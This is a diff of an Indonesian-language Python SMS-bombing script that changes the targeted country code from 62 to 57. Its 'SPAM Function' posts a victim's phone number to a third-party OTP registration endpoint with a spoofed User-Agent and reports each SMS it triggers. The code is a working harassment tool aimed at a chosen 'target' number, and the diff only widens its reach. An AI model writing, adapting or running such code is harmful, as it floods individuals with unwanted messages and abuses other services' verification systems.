@@ -33,8 +33,8 @@ def input():
   if len(nom) < 5:
     print "%s[%s!%s] %sMasukkan nomor target dengan benar!!"%(pu,me,pu,me)
     input()
-  elif nom.startswith(tuple(["62","+62","0"])):
-    print "%s[%s!%s] %sMasukkan nomor tanpa 62, +62, ataupun 0\n%s[%s!%s] %sContoh : 85877162199"%(pu,me,pu,ku,pu,me,pu,ku)
+  elif nom.startswith(tuple(["57","+57","0"])):
+    print "%s[%s!%s] %sMasukkan nomor tanpa 57, +57, ataupun 0\n%s[%s!%s] %sContoh : 85877162199"%(pu,me,pu,ku,pu,me,pu,ku)
     input()
   else:
     global jum
@@ -42,7 +42,7 @@ def input():
     main()
 #-------------------------------SPAM Function-------------------------------------------
 def asakita():
-  data={'username':'62'+nom}
+  data={'username':'57'+nom}
   h = requests.post("https://www.asakita.id/api/auth/register/otp",headers={'User-Agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'},data=data).text
   if 'MOBILE' in h:
    sukses("1","sms","asakita")
